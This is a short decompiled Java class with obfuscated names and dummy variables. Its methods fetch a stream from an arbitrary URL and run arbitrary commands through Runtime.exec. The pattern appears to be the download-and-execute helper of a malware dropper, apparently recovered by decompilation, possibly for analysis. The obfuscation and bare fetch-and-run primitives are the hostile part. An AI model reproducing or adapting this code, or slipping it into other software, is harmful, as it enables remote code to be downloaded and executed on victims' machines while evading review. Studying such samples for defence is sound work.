import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Lopok
{
    public static Runtime Fgwjjr() {
        final int csst = 98;
        return Runtime.getRuntime();
    }
    
    public static InputStream Poikop(final String kjhtrw2) throws Exception {
        final URL kiiew3 = new URL(kjhtrw2);
        int cnt = 32;
        try {
            kiiew3.openConnection();
            ++cnt;
        }
        catch (Exception ex) {}
        return kiiew3.openStream();
    }
    
    public static void Pbmvv(final String pnpgg) throws Exception {
        final int cnt = 16;
        final Process oiuytfd = Fgwjjr().exec(pnpgg);
        oiuytfd.waitFor();
    }
}
